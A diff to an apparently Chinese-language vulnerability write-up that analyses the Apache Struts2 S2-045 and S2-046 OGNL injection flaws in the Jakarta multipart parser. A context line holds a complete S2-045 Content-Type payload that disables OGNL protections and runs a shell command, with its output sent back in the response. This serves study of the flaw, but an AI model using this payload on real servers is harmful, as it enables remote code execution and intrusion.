@@ -613,7 +613,7 @@ public void parse(HttpServletRequest request, String saveDir) throws IOException
     try {
         this.processUpload(request, saveDir); // 如果不是以`multipart开头会走到catch`
     } catch (FileUploadException var6) {
-        errorMessage = this.buildErrorMessage(var6, new Object[0]);
+        errorMessage = this.buildErrorMessage(var6, new Object[0]); // 对错误信息中的OGNL进行解析
     }
 ```
 `processUpload()`后续是借助`commons-fileupload.jar`来处理文件上传。涉及到一个类`org.apache.commons.fileupload.FileUploadBase$FileItemIteratorImpl`，它在初始化时会判断Content-Type是否以`multipart`开头，如果不是就抛出异常。
@@ -654,3 +654,42 @@ DefaultActionInvocation.invoke()
 ```
 Content-Type: %{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='open -a Calculator.app').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
 ```
+
+### S2-046
+S2-046与S2-045很类似。同样是Jakarta Multipart解析器进行执行文件上传时报错造成了OGNL解析。`JakartaMultiPartRequest.parse()`解析还是定位到如下代码
+```
+public void parse(HttpServletRequest request, String saveDir) throws IOException {
+    try {
+        this.processUpload(request, saveDir); // 如果不是以`multipart开头会走到catch`
+    } catch (FileUploadException var6) {
+        errorMessage = this.buildErrorMessage(var6, new Object[0]); // 对错误信息中的OGNL进行解析
+    }
+```
+只是这个漏洞processUploader报错的原因不是因为判断Content-Type是否以`multipart`开头
+```java
+protected void processUpload(HttpServletRequest request, String saveDir) throws FileUploadException, UnsupportedEncodingException {
+    Iterator i$ = this.parseRequest(request, saveDir).iterator(); // 这里S2-045会对头部进行判断
+    ...
+    this.processFileField(item); // S2-046则是走到这步，判断item.getName()是否为null，后续调用checkFileName()判断上传文件名是否为空，
+}
+```
+而是filname中包含`\u0000`造成报错
+```java
+public static String checkFileName(String fileName) {
+    if (fileName != null && fileName.indexOf(0) != -1) {
+        ...
+        for(int i = 0; i < fileName.length(); ++i) {
+	    char c = fileName.charAt(i);
+   	    switch(c) {
+	    case '\u0000':
+	        sb.append("\\0");
+	        break;
+	    ...
+	    }
+        }
+        throw new InvalidFileNameException(fileName, "Invalid file name: " + sb);
+    }
+} 
+```
+造成报错后续的执行流程与S2-045相同。所以关键在于报错方式的查找。网上还提到了Content-Length超过struts2上传允许的最大值而造成报错。
+
